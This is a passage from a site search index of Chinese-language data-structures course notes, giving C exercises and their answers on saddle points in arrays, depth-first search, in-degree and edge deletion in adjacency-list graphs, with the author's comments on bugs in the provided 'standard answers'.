<p>\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u5b9a\u4e49\u4e86\u4e00\u4e2a\u51fd\u6570<code>Find</code>\uff0c\u7528\u4e8e\u67e5\u627e\u978d\u70b9\u3002\u8be5\u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u4e8c\u7ef4\u6570\u7ec4<code>arr</code>\u3001\u6570\u7ec4\u7684\u884c\u6570<code>row</code>\u548c\u5217\u6570<code>col</code>\u4f5c\u4e3a\u53c2\u6570\u3002</p> <p>\u5728<code>Find</code>\u51fd\u6570\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528\u4e86\u4e24\u4e2a\u5d4c\u5957\u7684\u5faa\u73af\u6765\u904d\u5386\u6570\u7ec4\u3002\u5916\u5c42\u5faa\u73af\u7528\u4e8e\u904d\u5386\u6bcf\u4e00\u884c\uff0c\u5185\u5c42\u5faa\u73af\u7528\u4e8e\u904d\u5386\u6bcf\u4e00\u5217\u3002</p> <p>\u5728\u5916\u5c42\u5faa\u73af\u4e2d\uff0c\u6211\u4eec\u9996\u5148\u627e\u5230\u5f53\u524d\u884c\u4e2d\u7684\u6700\u5927\u503c<code>max_row</code>\uff0c\u5e76\u5728\u5185\u5c42\u5faa\u73af\u4e2d\u5224\u65ad\u662f\u5426\u5b58\u5728\u6700\u5c0f\u503c<code>min_col</code>\u3002\u5982\u679c\u5f53\u524d\u884c\u4e2d\u7684\u6700\u5927\u503c\u4e5f\u662f\u6240\u5728\u5217\u7684\u6700\u5c0f\u503c\uff0c\u5219\u627e\u5230\u4e86\u978d\u70b9\u3002\u6211\u4eec\u5c06\u5176\u8f93\u51fa\uff0c\u5e76\u5c06<code>\u978d\u70b9\u627e\u5230</code>\u6807\u5fd7<code>flag</code>\u8bbe\u7f6e\u4e3a1\u3002</p> <p>\u82e5\u6ca1\u6709\u627e\u5230\u978d\u70b9\uff0c\u5219\u901a\u8fc7\u5224\u65ad<code>flag</code>\u7684\u503c\u662f\u5426\u4e3a0\u6765\u8f93\u51fa\"\u8be5\u6570\u7ec4\u4e2d\u4e0d\u5b58\u5728\u978d\u70b9\uff01\"\u7684\u4fe1\u606f\u3002</p> <p>\u5728<code>main</code>\u51fd\u6570\u4e2d\uff0c\u6211\u4eec\u58f0\u660e\u4e86\u4e00\u4e2a\u540d\u4e3a<code>arr</code>\u7684\u4e8c\u7ef4\u6570\u7ec4\uff0c\u7528\u4e8e\u5b58\u50a8\u7528\u6237\u8f93\u5165\u7684\u6570\u7ec4\u3002\u7136\u540e\uff0c\u6211\u4eec\u4f7f\u7528\u4e24\u4e2a\u5d4c\u5957\u7684\u5faa\u73af\u6765\u63a5\u6536\u7528\u6237\u8f93\u5165\u7684\u503c\uff0c\u5e76\u5c06\u5176\u5b58\u50a8\u5728<code>arr</code>\u6570\u7ec4\u4e2d\u3002</p> <p>\u6700\u540e\uff0c\u6211\u4eec\u8c03\u7528<code>Find</code>\u51fd\u6570\uff0c\u5e76\u5c06<code>arr</code>\u6570\u7ec4\u3001<code>ROW</code>\u548c<code>COL</code>\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u7ed9\u5b83\uff0c\u4ee5\u4fbf\u67e5\u627e\u978d\u70b9\u3002</p> <p>\u901a\u8fc7\u8fd9\u6bb5\u4ee3\u7801\uff0c\u7528\u6237\u53ef\u4ee5\u8f93\u5165\u4e00\u4e2a3x3\u7684\u6574\u6570\u6570\u7ec4\uff0c\u5e76\u6839\u636e\u8f93\u5165\u7684\u6570\u7ec4\u5224\u65ad\u662f\u5426\u5b58\u5728\u978d\u70b9\u3002\u5982\u679c\u5b58\u5728\u978d\u70b9\uff0c\u5c06\u8f93\u51fa\u978d\u70b9\u7684\u4f4d\u7f6e\u548c\u503c\uff1b\u5982\u679c\u4e0d\u5b58\u5728\u978d\u70b9\uff0c\u5c06\u8f93\u51fa\"\u8be5\u6570\u7ec4\u4e2d\u4e0d\u5b58\u5728\u978d\u70b9\uff01\"\u7684\u63d0\u793a\u4fe1\u606f\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_50","title":"\u6807\u51c6\u7b54\u6848","text":"<p>\u4e0d\u662f\u6211\u8bf4\uff0c\u867d\u7136\u8fd9\u53eb\u505a\u201c\u6807\u51c6\u7b54\u6848\u201d\uff0c\u4f46\u662f\u8fd9<code>col_min</code>\u521d\u59cb\u5316\u7684\u6307\u5b9a\u6709\u70b9\u95ee\u9898\uff0c\u903b\u8f91\u4e0d\u5bf9\uff0cVS\u8fd0\u884c\u51fa\u6765\u4e5f\u4e0d\u5bf9\u3002</p> C<pre><code>void Find(int arr[][COL], int row, int col) {\n\n    int i, j;\n    printf(\"\u8bf7\u8f93\u5165\u6570\u7ec4\uff1a\\n\");\n\n    // \u8bfb\u53d6\u7528\u6237\u8f93\u5165\u7684\u6570\u7ec4\n    for (i = 0; i &lt; ROW; i++) {\n        for (j = 0; j &lt; COL; j++) {\n            scanf(\"%d\", &amp;arr[i][j]);\n        }\n\n\n    int row_max = 0, col_min = 0;  // \u4fdd\u5b58\u884c\u6700\u5927\u503c\u548c\u5217\u6700\u5c0f\u503c              \n    int tag = 0;  // \u6807\u8bb0\u662f\u5426\u627e\u5230\u978d\u70b9\n\n    for (i = 0; i &lt; ROW; i++) {\n        row_max = arr[i][0];   // \u5047\u8bbe\u6bcf\u884c\u7b2c\u4e00\u4e2a\u5143\u7d20\u4e3a\u6700\u5927\u503c \n        col_min = arr[0][col]; // \u5047\u8bbe\u6bcf\u5217\u7b2c\u4e00\u4e2a\u5143\u7d20\u4e3a\u6700\u5c0f\u503c\n\n        for (j = 0; j &lt; COL; j++) {\n            // \u67e5\u627e\u5f53\u524d\u884c\u7684\u6700\u5927\u503c\u53ca\u5176\u5217\u4e0b\u6807\n            if (arr[i][j] &gt; row_max) {\n                row_max = arr[i][j];\n                row = i;  // \u8bb0\u5f55\u5f53\u524d\u884c\u4e0b\u6807\n                col = j;  // \u8bb0\u5f55\u5f53\u524d\u5217\u4e0b\u6807\n            }\n        }\n        // \u67e5\u627e\u5f53\u524d\u5217\u7684\u6700\u5c0f\u503c\n        for (j = 1; j &lt; COL; j++) {\n            if (arr[j][col] &lt;= col_min)\n                col_min = arr[j][col];\n        }\n        // \u5224\u65ad\u662f\u5426\u5b58\u5728\u978d\u70b9\n        if (col_min == row_max) {\n            printf(\"\u8be5\u6570\u7ec4\u4e2d\u5b58\u5728\u978d\u70b9 arr[%d][%d] = %d\\n\", row, col, row_max);\n            tag = 1;\n        }\n    }\n    // \u5982\u679c\u6ca1\u6709\u627e\u5230\u978d\u70b9\uff0c\u5219\u8f93\u51fa\u4e0d\u5b58\u5728\u7684\u63d0\u793a\n    if (tag == 0)\n        printf(\"\u8be5\u6570\u7ec4\u4e2d\u4e0d\u5b58\u5728\u978d\u70b9\uff01\\n\");\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_51","title":"\u81ea\u884c\u6539\u6b63\uff08\u8003\u8bd5\u7528\u8fd9\u4e2a\uff09","text":"C<pre><code>void Find(int arr[][COL], int row, int col) {\n    int i, j;\n    printf(\"\u8bf7\u8f93\u5165\u6570\u7ec4\uff1a\\n\");\n\n    for (i = 0; i &lt; row; i++) {\n        for (j = 0; j &lt; col; j++) {\n            scanf(\"%d\", &amp;arr[i][j]);\n        }\n    }\n\n    int tag = 0;\n    for (i = 0; i &lt; row; i++) {\n        int row_max = arr[i][0]; // \u521d\u59cb\u5316\u6bcf\u884c\u7684\u6700\u5927\u503c\n        int col_index = 0; // \u8bb0\u5f55\u6700\u5927\u503c\u6240\u5728\u7684\u5217\u7d22\u5f15\n\n        // \u627e\u51fa\u5f53\u524d\u884c\u7684\u6700\u5927\u503c\u548c\u5176\u5217\u7d22\u5f15\n        for (j = 1; j &lt; col; j++) {\n            if (arr[i][j] &gt; row_max) {\n                row_max = arr[i][j];\n                col_index = j;\n            }\n        }\n\n        // \u68c0\u67e5\u5f53\u524d\u5217\u662f\u5426\u4e3a\u8be5\u6700\u5927\u503c\u6240\u5728\u7684\u5217\u4e2d\u7684\u6700\u5c0f\u503c\n        int col_min = arr[0][col_index];\n        for (j = 0; j &lt; row; j++) {\n            if (arr[j][col_index] &lt; col_min) {\n                col_min = arr[j][col_index];\n            }\n        }\n\n        // \u5982\u679c\u8be5\u5217\u4e2d\u7684\u6700\u5c0f\u503c\u4e0e\u8be5\u884c\u4e2d\u7684\u6700\u5927\u503c\u76f8\u7b49\uff0c\u5219\u627e\u5230\u978d\u70b9\n        if (col_min == row_max) {\n            printf(\"\u8be5\u6570\u7ec4\u4e2d\u5b58\u5728\u978d\u70b9 arr[%d][%d] = %d\\n\", i, col_index, row_max);\n            tag = 1;\n        }\n    }\n\n    if (tag == 0) {\n        printf(\"\u8be5\u6570\u7ec4\u4e2d\u4e0d\u5b58\u5728\u978d\u70b9\uff01\\n\");\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E5%9B%BE/","title":"Alpha \u56fe","text":""},{"location":"DEC/Data-Structure/Alpha-%E5%9B%BE/#_1","title":"\u6df1\u5ea6\u4f18\u5148\u904d\u5386","text":"<p>\u7ed9\u5b9a\u56fe\u7684\u90bb\u63a5\u8868\u8868\u793a\u548c\u8d77\u59cb\u9876\u70b9\u7d22\u5f15\uff0c\u8bf7\u7f16\u5199\u7a0b\u5e8f\uff0c\u5b9e\u73b0\u56fe\u7684\u6df1\u5ea6\u4f18\u5148\u904d\u5386\u51fd\u6570<code>DFS</code>\uff0c\u5e76\u8f93\u51fa\u904d\u5386\u7684\u9876\u70b9\u5e8f\u5217\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E5%9B%BE/#_2","title":"\u793a\u4f8b\u8f93\u51fa","text":"Text Only<pre><code>0 11 12 9 1 5 2 3 4 6 10 7 8\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E5%9B%BE/#_3","title":"\u9898\u76ee","text":"C<pre><code>//\u6df1\u5ea6\u4f18\u5148\u904d\u5386 \n\n#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n#include&lt;string.h&gt;\n\n//\u56fe\u7684\u90bb\u63a5\u8868\u7684\u5b58\u50a8\u8868\u793a \n#define MAX_VERTEX_NUM 20\ntypedef int VertexType;\n//\u8868\u7ed3\u70b9 \ntypedef struct ArcNode{\n    int adjvex;     //\u8be5\u5f27\u6240\u6307\u5411\u9876\u70b9\u7684\u4f4d\u7f6e \n    struct ArcNode*nextarc; //\u6307\u5411\u4e0b\u4e00\u6761\u5f27\u7684\u6307\u9488 \n}ArcNode;\n//\u5934\u7ed3\u70b9 \ntypedef struct Vnode{\n    VertexType data;    //\u9876\u70b9\u4fe1\u606f \n    ArcNode*firstarc;   //\u6307\u5411\u7b2c\u4e00\u6761\u4f9d\u9644\u8be5\u9876\u70b9\u7684\u5f27\u7684\u6307\u9488 \n    int visited;        //\u8bbf\u95ee \n}Vnode,AdjList[MAX_VERTEX_NUM];\n\ntypedef struct{\n    AdjList vertices;\n    int vexnum,arcnum;  //\u56fe\u7684\u5f53\u524d\u9876\u70b9\u6570\u548c\u5f27\u6570 \n    int kind;           //\u56fe\u7684\u79cd\u7c7b\u6807\u5fd7 \n}ALGraph;\n\nALGraph *creategraph(int a[][4], int n)\n{\n    ALGraph *g=(ALGraph*)malloc(sizeof(ALGraph));\n    g-&gt;vexnum=n;\n\n    int i,j;\n    for(i=0;i&lt;n;i++)\n    {\n        g-&gt;vertices[i].data=i;\n        g-&gt;vertices[i].visited=0;\n        ArcNode *p = g-&gt;vertices[i].firstarc;\n        for (j=0;j&lt;4;j++)\n        {\n            if(a[i][j]&gt;=0)\n            {\n                //printf(\"%d %d %d\\n\",i,j,a[i][j]);\n                ArcNode *q = (ArcNode*)malloc(sizeof(ArcNode));\n                q-&gt;adjvex=a[i][j];\n                q-&gt;nextarc = NULL;\n                //printf(\"q %d\\n\",q-&gt;adjvex);\n                if(j==0){\n                    g-&gt;vertices[i].firstarc = q;\n                    //printf(\"g-&gt;vertices[i].firstarc %d\\n\",g-&gt;vertices[i].firstarc-&gt;adjvex);\n                }else{\n                    p-&gt;nextarc = q;\n                }\n                p = q;\n            }else{\n                break; \n            }\n\n        }\n    }\n    return g;\n}\n\n//\u8bf7\u5b8c\u6210\u6b64\u5904\u7b97\u6cd5\uff0c\u5b9e\u73b0\u56fe\u7684\u6df1\u5ea6\u4f18\u5148\u904d\u5386\n//index\u8868\u793a\u641c\u7d22\u7684\u9876\u70b9\n//\u6ce8\uff1a\u9876\u70b9\u7f16\u53f7\u4ece0\u5f00\u59cb \nvoid DFS(ALGraph *g,int index)\n{    \n    //\u8bf7\u5728\u6b64\u5904\u586b\u5199\u4ee3\u7801\n\n\n\n}\n\nint main()\n{\n    int n = 13; //\u9876\u70b9\u6570 \n    int a[13][4] = {{11,5,2,1},{12,0,-1},{0,-1},{4,-1},{3,-1},{0,-1},{10,8,7,-1},{10,6,-1},{6,-1},{12,11,-1},{7,6,-1},{12,9,0,-1},{11,9,1,-1}};\n    ALGraph *g=creategraph(a,n);\n    DFS(g,0);\n    DFS(g,3);\n    DFS(g,6);\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E5%9B%BE/#_4","title":"\u7b54\u6848","text":"C<pre><code>void DFS(ALGraph* g, int index)\n{\n    // \u83b7\u53d6\u5f53\u524d\u9876\u70b9\n    Vnode* node = &amp;(g-&gt;vertices[index]); // \u5148\u627e\u5230\u8fd9\u4e2a\u70b9\n    node-&gt;visited = 1;\n    printf(\"%d \", node-&gt;data);\n\n    // \u904d\u5386\u5f53\u524d\u9876\u70b9\u7684\u90bb\u63a5\u70b9\n    ArcNode* tmp = node-&gt;firstarc; // \u5148\u62ff\u51fa\u8fd9\u4e2a\u8fb9\n    while (tmp != NULL) {\n        int adjvex = tmp-&gt;adjvex; // \u62ff\u51fa\u8fd9\u4e2a\u8fb9\u6307\u5411\u7684\u9876\u70b9\u4f4d\u7f6e\n        Vnode* adjnode = &amp;(g-&gt;vertices[adjvex]); // \u518d\u62ff\u51fa\u8fd9\u4e2a\u9876\u70b9\n\n        // \u82e5\u90bb\u63a5\u70b9\u672a\u88ab\u8bbf\u95ee\u8fc7\uff0c\u5219\u9012\u5f52\u8bbf\u95ee\u8be5\u90bb\u63a5\u70b9\n        if (adjnode-&gt;visited == 0) {\n            DFS(g, adjvex);\n        }\n        tmp = tmp-&gt;nextarc;\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E5%9B%BE/#_5","title":"\u6807\u51c6\u7b54\u6848\uff08\u4e0d\u592a\u597d\uff09","text":"C<pre><code>void DFS(ALGraph* g, int index)\n{\n    Vnode* node = &amp;g-&gt;vertices[index];\n    ArcNode* tmp = node-&gt;firstarc;\n\n    if (node-&gt;visited == 0){\n        printf(\"%d \", node-&gt;data);\n        node-&gt;visited = 1;\n\n        while (tmp != NULL) {\n            DFS(g, tmp-&gt;adjvex);\n            tmp = tmp-&gt;nextarc;\n        }\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E5%9B%BE/#_6","title":"\u6709\u5411\u56fe\u9876\u70b9\u7684\u5165\u5ea6","text":"<p>\u7ed9\u5b9a\u56fe\u7684\u90bb\u63a5\u8868\u548c\u4e00\u4e2a\u9876\u70b9\u7f16\u53f7\uff0c\u8bf7\u7f16\u5199\u7a0b\u5e8f\u5b8c\u6210\u51fd\u6570<code>GetIndegreeNum</code>\uff0c\u5b9e\u73b0\u8ba1\u7b97\u6307\u5b9a\u9876\u70b9\u7684\u5165\u5ea6\u7684\u529f\u80fd\u3002\uff08\u6ce8\uff1a\u9876\u70b9\u503c\u7f16\u53f7\u4ece 0 \u5f00\u59cb\uff0c0\uff5en-1\uff09</p>"},{"location":"DEC/Data-Structure/Alpha-%E5%9B%BE/#_7","title":"\u793a\u4f8b\u8f93\u51fa","text":"Text Only<pre><code>2\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E5%9B%BE/#_8","title":"\u9898\u76ee","text":"C<pre><code>//\u8ba1\u7b97\u6709\u5411\u56fe\u67d0\u4e2a\u9876\u70b9\u4e3a\u7684\u5165\u5ea6 \uff08\u6ce8\uff1a\u9876\u70b9\u503c\u7f16\u53f7\u4ece0\u5f00\u59cb\uff0c0\uff5en-1\uff09\n#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n\n//\u56fe\u7684\u90bb\u63a5\u8868\u7684\u5b58\u50a8\u8868\u793a \n#define MAX_VERTEX_NUM 20\ntypedef int VertexType;\n//\u8868\u7ed3\u70b9 \ntypedef struct ArcNode{\n    int adjvex;     //\u8be5\u5f27\u6240\u6307\u5411\u9876\u70b9\u7684\u4f4d\u7f6e \n    struct ArcNode*nextarc; //\u6307\u5411\u4e0b\u4e00\u6761\u5f27\u7684\u6307\u9488 \n}ArcNode;\n//\u5934\u7ed3\u70b9 \ntypedef struct Vnode{\n    VertexType data;    //\u9876\u70b9\u4fe1\u606f \n    ArcNode*firstarc;   //\u6307\u5411\u7b2c\u4e00\u6761\u4f9d\u9644\u8be5\u9876\u70b9\u7684\u5f27\u7684\u6307\u9488 \n}Vnode,AdjList[MAX_VERTEX_NUM];\n\ntypedef struct{\n    AdjList vertices;\n    int vexnum,arcnum;  //\u56fe\u7684\u5f53\u524d\u9876\u70b9\u6570\u548c\u5f27\u6570 \n    int kind;           //\u56fe\u7684\u79cd\u7c7b\u6807\u5fd7 \n}ALGraph;\n\n\n//\u5efa\u7acb\u6709\u5411\u56fe\u7684\u90bb\u63a5\u8868\u5b58\u50a8\u7ed3\u6784\n//n\u4e3a\u9876\u70b9\u6570\n//\u8fd4\u56de\u5efa\u7acb\u7684\u56fe\u7684\u6307\u9488 \nALGraph *creategraph(int a[][4], int n)\n{\n    ALGraph *g=(ALGraph*)malloc(sizeof(ALGraph));\n    g-&gt;vexnum=n;\n\n    int i,j;\n    for(i=0;i&lt;n;i++)\n    {\n        g-&gt;vertices[i].data=i;\n        ArcNode *p = g-&gt;vertices[i].firstarc;\n        for (j=0;j&lt;4;j++)\n        {\n            if(a[i][j]&gt;=0)\n            {\n                //printf(\"%d %d %d\\n\",i,j,a[i][j]);\n                ArcNode *q = (ArcNode*)malloc(sizeof(ArcNode));\n                q-&gt;adjvex=a[i][j];\n                q-&gt;nextarc = NULL;\n                //printf(\"q %d\\n\",q-&gt;adjvex);\n                if(j==0){\n                    g-&gt;vertices[i].firstarc = q;\n                    //printf(\"g-&gt;vertices[i].firstarc %d\\n\",g-&gt;vertices[i].firstarc-&gt;adjvex);\n                }else{\n                    p-&gt;nextarc = q;\n                }\n                p = q;\n            }else{\n                break; \n            }\n\n        }\n    }\n    return g;\n}\n\n//x:\u8981\u8ba1\u7b97\u5165\u5ea6\u7684\u9876\u70b9\u7f16\u53f7\uff0c\u6ce8\uff1a\u9876\u70b9\u7f16\u53f7\u4ece0\u5f00\u59cb\n//\u8fd4\u56de\u503c\uff1a\u8be5\u9876\u70b9\u7684\u5165\u5ea6 \n//\u8bf7\u5b8c\u6210\u8be5\u51fd\u6570\uff0c\u5b9e\u73b0\u6c42\u67d0\u9876\u70b9\u7684\u5165\u5ea6 \nint GetIndegreeNum(ALGraph *g, int x){\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801 \n\n\n\n}\n\nint main()\n{\n    int n = 4; //\u9876\u70b9\u6570 \n    int a[4][4] = {{2,1,-1},{3,-1},{3,-1},{0,-1}};\n    ALGraph *g=creategraph(a,n);\n    printf(\"%d\",GetIndegreeNum(g, 3));\n}  \n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E5%9B%BE/#_9","title":"\u6807\u51c6\u7b54\u6848","text":"C<pre><code>int GetIndegreeNum(ALGraph* g, int x) {\n    int indegree = 0; // \u53d8\u91cf\u7528\u4e8e\u5b58\u50a8\u5165\u5ea6\n\n    // \u904d\u5386\u56fe\u4e2d\u7684\u6240\u6709\u9876\u70b9\n    for (int i = 0; i &lt; g-&gt;vexnum; i++) {\n        // \u904d\u5386\u6bcf\u4e2a\u9876\u70b9\u7684\u90bb\u63a5\u8868\n        ArcNode* p = g-&gt;vertices[i].firstarc; // \u6bcf\u4e2a\u9876\u70b9\u6307\u51fa\u53bb\u7684\u7b2c\u4e00\u6761\u8fb9\n        while (p != NULL) {\n            // \u5982\u679c\u90bb\u63a5\u9876\u70b9\u662fx\uff0c\u5219\u589e\u52a0\u5165\u5ea6\u8ba1\u6570\n            if (p-&gt;adjvex == x) {\n                indegree++;\n                //break;\n            }\n            p = p-&gt;nextarc;\n        }\n    }\n\n    return indegree;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E5%9B%BE/#_10","title":"\u65e0\u5411\u56fe\u90bb\u63a5\u8868\u5b58\u50a8\u7ed3\u6784\u5220\u9664\u6307\u5b9a\u7684\u8fb9","text":"<p>\u7ed9\u5b9a\u56fe\u7684\u90bb\u63a5\u8868\u548c\u4e24\u4e2a\u9876\u70b9\u7f16\u53f7\uff0c\u7f16\u5199\u7a0b\u5e8f\uff0c\u5b8c\u6210<code>DelEdge</code>\u51fd\u6570\uff0c\u5b9e\u73b0\u4ece\u65e0\u5411\u56fe\u7684\u90bb\u63a5\u8868\u4e2d\u5220\u9664\u6307\u5b9a\u7684\u8fb9\u7684\u529f\u80fd\u3002\uff08\u6ce8\uff1a\u9876\u70b9\u503c\u7f16\u53f7\u4ece0\u5f00\u59cb\uff0c0\uff5en-1\uff09</p>"},{"location":"DEC/Data-Structure/Alpha-%E5%9B%BE/#_11","title":"\u793a\u4f8b\u8f93\u51fa","text":"Text Only<pre><code>vertices:0 3 2 1 vertices:1 2 0 vertices:2 3 1 0 vertices:3 2 0\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E5%9B%BE/#_12","title":"\u9898\u76ee","text":"C<pre><code>//\u8bf7\u5b8c\u6210DelEdge\u51fd\u6570\uff0c\u5b9e\u73b0\u4ece\u65e0\u5411\u56fe\u7684\u90bb\u63a5\u8868\u4e2d\u5220\u9664\u67d0\u6761\u8fb9\u7684\u529f\u80fd\u3002\uff08\u6ce8\uff1a\u9876\u70b9\u503c\u7f16\u53f7\u4ece0\u5f00\u59cb\uff0c0\uff5en-1\uff09\n#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n\n//\u56fe\u7684\u90bb\u63a5\u8868\u7684\u5b58\u50a8\u8868\u793a \n#define MAX_VERTEX_NUM 20\ntypedef int VertexType;\n//\u8868\u7ed3\u70b9 \ntypedef struct ArcNode{\n    int adjvex;     //\u8be5\u5f27\u6240\u6307\u5411\u9876\u70b9\u7684\u4f4d\u7f6e \n    struct ArcNode*nextarc; //\u6307\u5411\u4e0b\u4e00\u6761\u5f27\u7684\u6307\u9488 \n}ArcNode;\n//\u5934\u7ed3\u70b9 \ntypedef struct Vnode{\n    VertexType data;    //\u9876\u70b9\u4fe1\u606f \n    ArcNode*firstarc;   //\u6307\u5411\u7b2c\u4e00\u6761\u4f9d\u9644\u8be5\u9876\u70b9\u7684\u5f27\u7684\u6307\u9488 \n}Vnode,AdjList[MAX_VERTEX_NUM];\n\ntypedef struct{\n    AdjList vertices;\n    int vexnum,arcnum;  //\u56fe\u7684\u5f53\u524d\u9876\u70b9\u6570\u548c\u5f27\u6570 \n    int kind;           //\u56fe\u7684\u79cd\u7c7b\u6807\u5fd7 \n}ALGraph;\n\n\n//\u5efa\u7acb\u6709\u5411\u56fe\u7684\u90bb\u63a5\u8868\u5b58\u50a8\u7ed3\u6784\n//n\u4e3a\u9876\u70b9\u6570\n//\u8fd4\u56de\u5efa\u7acb\u7684\u56fe\u7684\u6307\u9488 \nALGraph *creategraph(int a[][4], int n){\n    ALGraph *g=(ALGraph*)malloc(sizeof(ALGraph));\n    g-&gt;vexnum=n;\n\n    int i;\n    for(i=0;i&lt;n;i++)\n    {\n        g-&gt;vertices[i].data=i;\n        ArcNode *p = g-&gt;vertices[i].firstarc;\n        for (j=0;j&lt;4;j++)\n        {\n            if(a[i][j]&gt;=0)\n            {\n                //printf(\"%d %d %d\\n\",i,j,a[i][j]);\n                ArcNode *q = (ArcNode*)malloc(sizeof(ArcNode));\n                q-&gt;adjvex=a[i][j];\n                q-&gt;nextarc = NULL;\n                //printf(\"q %d\\n\",q-&gt;adjvex);\n                if(j==0){\n                    g-&gt;vertices[i].firstarc = q;\n                    //printf(\"g-&gt;vertices[i].firstarc %d\\n\",g-&gt;vertices[i].firstarc-&gt;adjvex);\n                }else{\n                    p-&gt;nextarc = q;\n                }\n                p = q;\n            }else{\n                break; \n            }\n\n        }\n    }\n    return g;\n}\n\n//\u6253\u5370\u56fe\nvoid DisplayGraph(ALGraph *g){\n    //printf(\"\u9876\u70b9:%d\uff0c\u5f27:%d\\n\", g-&gt;vexnum,g-&gt;arcnum);\n    int i,j;\n    for ( i = 0; i &lt; g-&gt;vexnum; i++)\n    {\n        printf(\"vertices:%d \", g-&gt;vertices[i].data);\n        ArcNode* p = g-&gt;vertices[i].firstarc;\n        while( p != NULL)\n        {\n            printf(\"%d \", p-&gt;adjvex);\n            p = p-&gt;nextarc;\n        }\n        //printf(\"\\n\");\n    }\n}\n\n//x,y\u4e3a\u8981\u5220\u9664\u8fb9\u7684\u4e24\u4e2a\u9876\u70b9\u7f16\u53f7\uff0c\u6ce8\uff1a\u9876\u70b9\u7f16\u53f7\u4ece0\u5f00\u59cb \n//\u8bf7\u5b8c\u6210\u6b64\u51fd\u6570\uff0c\u5b9e\u73b0\u4ece\u65e0\u5411\u56fe\u7684\u90bb\u63a5\u8868\u4e2d\u5220\u9664\u67d0\u6761\u8fb9\u7684\u529f\u80fd \nvoid DelEdge(ALGraph *g,int x, int y){\n    //\u8bf7\u5728\u6b64\u5904\u5b8c\u6210\u8be5\u51fd\u6570 \n\n\n\n}\n\nint main(){\n    int n = 4; //\u9876\u70b9\u6570 \n    int a[4][4] = {{3,2,1,-1},{3,2,0,-1},{3,1,0,-1},{2,1,0,-1}};\n    ALGraph *g=creategraph(a,n);\n    DelEdge(g, 3, 1);\n    DisplayGraph(g);\n} \n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E5%9B%BE/#_13","title":"\u7b54\u6848","text":"<p><code>creategraph()</code>\u51fd\u6570\u6709\u9519\u8bef\uff0c\u6ca1\u6709\u5b9a\u4e49\u53d8\u91cf<code>j</code>\u3002\u52a0\u4e0a\u5c31\u884c\u4e86</p> C<pre><code>void DelEdge(ALGraph* g, int x, int y) {\n    ArcNode* px = g-&gt;vertices[x].firstarc;\n    ArcNode* py = g-&gt;vertices[y].firstarc;\n    ArcNode* px_prev = NULL;\n    ArcNode* py_prev = NULL;\n\n    // \u5728\u9876\u70b9x\u7684\u90bb\u63a5\u8868\u4e2d\u67e5\u627e\u8fb9\uff0c\u5e76\u8bb0\u5f55\u524d\u4e00\u4e2a\u7ed3\u70b9\n    while (px != NULL &amp;&amp; px-&gt;adjvex != y) {\n        px_prev = px;\n        px = px-&gt;nextarc;\n    }\n\n    // \u5728\u9876\u70b9y\u7684\u90bb\u63a5\u8868\u4e2d\u67e5\u627e\u8fb9\uff0c\u5e76\u8bb0\u5f55\u524d\u4e00\u4e2a\u7ed3\u70b9\n    while (py != NULL &amp;&amp; py-&gt;adjvex != x) {\n        py_prev = py;\n        py = py-&gt;nextarc;\n    }\n\n    // \u5982\u679c\u5728\u4e24\u4e2a\u90bb\u63a5\u8868\u4e2d\u90fd\u627e\u5230\u76f8\u5e94\u7684\u8fb9\uff0c\u5219\u4ece\u4e2d\u5220\u9664\u8fb9\uff0c\u5e76\u91ca\u653e\u5185\u5b58\n    if (px != NULL &amp;&amp; py != NULL) {\n        // \u4ece\u9876\u70b9x\u7684\u90bb\u63a5\u8868\u4e2d\u5220\u9664\u8fb9\n        if (px_prev == NULL) {\n            g-&gt;vertices[x].firstarc = px-&gt;nextarc;\n        }\n        else {\n            px_prev-&gt;nextarc = px-&gt;nextarc;\n        }\n        free(px);\n\n        // \u4ece\u9876\u70b9y\u7684\u90bb\u63a5\u8868\u4e2d\u5220\u9664\u8fb9\n        if (py_prev == NULL) {\n            g-&gt;vertices[y].firstarc = py-&gt;nextarc;\n        }\n        else {\n            py_prev-&gt;nextarc = py-&gt;nextarc;\n        }\n        free(py);\n\n        // \u8fb9\u7684\u6570\u91cf\u51cf1\n        g-&gt;arcnum--;\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E5%9B%BE/#_14","title":"\u6807\u51c6\u7b54\u6848\uff08\u4e0d\u592a\u597d\uff09","text":"<p>\u5176\u5b9e\u548c\u54b1\u90a3\u4e2a\u4e5f\u4e00\u6837</p> C<pre><code>void DelEdge(ALGraph *g,int x, int y)\n{\n    ArcNode* p = g-&gt;vertices[x].firstarc;\n    ArcNode* pre = g-&gt;vertices[x].firstarc;\n    if(p-&gt;adjvex == y){\n        g-&gt;vertices[x].firstarc = p-&gt;nextarc;\n        free(p);\n    }else{\n        while(p-&gt;nextarc != NULL){\n            p = p-&gt;nextarc;\n            if(p-&gt;adjvex == y){\n                pre-&gt;nextarc = p-&gt;nextarc;\n                free(p);\n                break;\n            }\n            pre = p;\n        }\n    }\n\n    p = g-&gt;vertices[y].firstarc;\n    pre = g-&gt;vertices[y].firstarc;\n    if(p-&gt;adjvex == x){\n        g-&gt;vertices[y].firstarc = p-&gt;nextarc;\n        free(p);\n    }else{\n        while(p-&gt;nextarc != NULL){\n        